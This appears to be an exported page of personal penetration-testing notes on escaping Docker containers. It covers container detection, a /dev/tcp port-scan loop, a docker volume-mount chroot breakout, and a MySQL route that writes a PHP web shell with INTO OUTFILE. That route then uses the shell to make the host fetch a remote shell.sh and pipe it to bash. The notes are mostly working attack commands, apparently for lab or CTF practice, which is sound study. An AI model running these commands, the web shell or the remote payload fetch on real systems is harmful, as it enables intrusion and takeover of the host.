<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>7-escape-docker-container</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>7-escape-docker-container</h1><br/><p><h2>Identify a container</h2></p><p></p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">ps</span> aux <br /><span style="color:#0088ff;font-weight:400">##containers have few processes runing </span><br /><span style="color:#0088ff;font-weight:400">## Every process running on Linux will be assigned a PID and a namespace.Namespaces are how containerization is achieved! Processes can only &quot;see&quot; the process that is in the same namespace - no conflicts in theory. Take Docker; for example, every new container will be running as a new namespace, although the container may be running multiple applications (and, in turn, processes).</span><br /><span style="color:#ff9d00;font-weight:700">hostname</span> <br /><span style="color:#0088ff;font-weight:400">## e.g 14c75992b944 =&gt; strong indication that it is not  a real machine </span><br /><span style="color:#ff9d00;font-weight:700">ls</span> -la / <br /><span style="color:#0088ff;font-weight:400">## .docketenv</span><br /><span style="color:#0088ff;font-weight:400">### ontainers allow environment variables to be provided from the host operating system by the use of a .dockerenv file.</span><br /><span style="color:#ff9d00;font-weight:700">cat</span> /proc/<span style="color:#7f0044;font-weight:400">$pid</span>/cgroup<br /><span style="color:#0088ff;font-weight:400">##Cgroups are used by containerization software such as LXC or Docker. Let&#39;s look for them by navigating to /proc/1 and then catting the &quot;cgroup&quot; file... It is worth mentioning that the &quot;cgroups&quot; file contains paths including the word &quot;docker&quot;.</span><br /><span style="color:#0088ff;font-weight:400">## rather empty on real machine </span><br /><br /><span style="color:#ff9d00;font-weight:700">ifconfig</span> <br /><span style="color:#0088ff;font-weight:400">## differenet internal ip addr </span></pre></div></p><p></p><p><h2>Port scan on the container</h2></p><p><div class="codebox"><pre>arp -a <br /><span style="color:#ff9d00;font-weight:700">for</span> <span style="color:#7f0044;font-weight:400">i</span> <span style="color:#ff9d00;font-weight:700">in</span> {1..10000}<span style="color:#ff9d00;font-weight:700">;do</span> <span style="color:#ff9d00;font-weight:700">2&gt;/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null <span style="color:#ff9d00;font-weight:700">&gt;</span> <span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>tcp<span style="color:#ff9d00;font-weight:700">/</span>172.17.0.1<span style="color:#ff9d00;font-weight:700">/</span><span style="color:#7f0044;font-weight:400">$i</span> <span style="color:#ff9d00;font-weight:700">&amp;&amp;</span> <span style="color:#ff9d00;font-weight:700">echo</span> Port <span style="color:#7f0044;font-weight:400">$i</span> open<span style="color:#ff9d00;font-weight:700">;done</span><br /></pre></div></p><p></p><p><strong></strong></p><p><strong></strong><h2>Docker security cheatsheet</h2><ul><li>https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html</li></ul><strong></strong></p><p><strong></strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong></strong><h2>Docker enumeration</h2><strong></strong></p><p><strong></strong><ul><li><strong>env environments</strong></li></ul><strong></strong></p><p><strong></strong><strong></strong></p><p><strong></strong><h2>Docker breakout 1: mount</h2><ul><li><a href="https://gtfobins.github.io/gtfobins/docker/">https://gtfobins.github.io/gtfobins/docker/</a><ul><li>docker run -v /:/mnt --rm -it alpine chroot /mnt sh</li></ul></li></ul></p><p></p><p></p><p><h2>Docker breakout 2: mysql to gateway (access to remote database granted)</h2><ul><li>Theory<ul><li> Access the remote database using administrator credentials</li><li>Create a new table in the main database</li><li>Inject PHP code to gain command execution<ul><li>Example code: &lt;?php $cmd=$_GET[&quot;cmd&quot;];system($cmd);?&gt;</li></ul></li><li>Drop table contents onto a file the user can access</li><li>Execute and obtain RCE on the host.</li></ul></li><li>Practical<ul><li>select &#39;&lt;?php $cmd=$_GET[&quot;cmd&quot;];system($cmd);?&gt;&#39; INTO OUTFILE &#39;/var/www/html/shell.php&#39;;</li><li>curl <a href="http://192.168.100.1:8080/shell.php?cmd=ls">http://192.168.100.1:8080/shell.php?cmd=ls</a></li></ul></li><li>upload shellscript.sh into docker </li><li>curl <a href="http://192.168.100.1:8080/shell.php?cmd=ls">http://192.168.100.1:8080/shell.php?</a>cmd= wget+http://10.50.103.240/shell.sh|bash &amp;</li><li>curl%20http%3A%2F%2F10.50.103.240%2Fshell.sh%7Cbash%20%26</li></ul></p></div>
</body>
</html>
